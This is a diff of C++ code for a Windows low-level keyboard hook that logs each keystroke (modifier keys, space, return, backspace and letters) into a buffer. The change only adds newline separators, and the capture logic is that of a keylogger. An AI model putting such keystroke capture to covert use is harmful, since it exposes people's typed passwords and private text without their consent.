@@ -34,17 +34,17 @@ LRESULT CALLBACK KeyboardProc(int nCode,
         case WM_SYSKEYUP:
 
             if (vkCode == VK_LSHIFT) {
-                codepointStringBuffer.push_back(std::string("<VK_LSHIFT up>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_LSHIFT up>"));
                 leftShiftDown = FALSE;
             } else if (vkCode == VK_RSHIFT) {
-                codepointStringBuffer.push_back(std::string("<VK_RSHIFT up>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_RSHIFT up>"));
                 rightShiftDown = FALSE;
             } else if (vkCode == VK_LMENU) {
-                codepointStringBuffer.push_back(std::string("<VK_LMENU up>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_LMENU up>"));
             } else if (vkCode == VK_RMENU) {
-                codepointStringBuffer.push_back(std::string("<VK_RMENU up>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_RMENU up>"));
             } else if (vkCode == VK_CAPITAL) {
-                codepointStringBuffer.push_back(std::string("<VK_CAPITAL up>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_CAPITAL up>"));
                 capsLockDown = !capsLockDown;
             }
 
@@ -58,41 +58,42 @@ LRESULT CALLBACK KeyboardProc(int nCode,
         case WM_SYSKEYDOWN:
 
             if (vkCode == VK_LSHIFT) {
-                codepointStringBuffer.push_back(std::string("<VK_LSHIFT down>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_LSHIFT down>"));
                 leftShiftDown = TRUE;
             } else if (vkCode == VK_RSHIFT) {
-                codepointStringBuffer.push_back(std::string("<VK_RSHIFT down>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_RSHIFT down>"));
                 rightShiftDown = TRUE;
             } else if (vkCode == VK_LMENU) {
-                codepointStringBuffer.push_back(std::string("<VK_LMENU down>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_LMENU down>"));
             } else if (vkCode == VK_RMENU) {
-                codepointStringBuffer.push_back(std::string("<VK_RMENU down>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_RMENU down>"));
             } else if (vkCode == VK_SPACE) {
-                codepointStringBuffer.push_back(std::string(" "));
+                codepointStringBuffer.push_back(std::string("\n<SPACE>"));
             } else if (vkCode == VK_CAPITAL) {
-                codepointStringBuffer.push_back(std::string("<VK_CAPITAL down>"));
+                codepointStringBuffer.push_back(std::string("\n<VK_CAPITAL down>"));
                 capsLockDown != capsLockDown;
             } else if (vkCode == VK_RETURN) {
-                codepointStringBuffer.push_back(std::string("<RETURN>\n"));
+                codepointStringBuffer.push_back(std::string("\n<RETURN>\n"));
             } else if (vkCode == VK_BACK) {
-                codepointStringBuffer.push_back(std::string("<BACKWARDS>"));
+                codepointStringBuffer.push_back(std::string("\n<BACKWARDS>"));
             } else if (vkCode == VK_TAB) {
-                codepointStringBuffer.push_back(std::string("<TAB>"));
+                codepointStringBuffer.push_back(std::string("\n<TAB>"));
             } else {
                 char ch = (char) vkCode;
 
                 if (leftShiftDown || rightShiftDown || capsLockDown) {
                     if (std::isalnum(vkCode)) {
                         std::string s{ch};
+                        codepointStringBuffer.push_back(std::string("\n"));
                         codepointStringBuffer.push_back(s);
                     }
                 } else {
                     if (std::isalnum(vkCode)) {
                         std::string s{(char)(ch + 32)};
+                        codepointStringBuffer.push_back(std::string("\n"));
                         codepointStringBuffer.push_back(s);
                     }
                 }
-
             }
 
             if (codepointStringBuffer.size() > 30) {
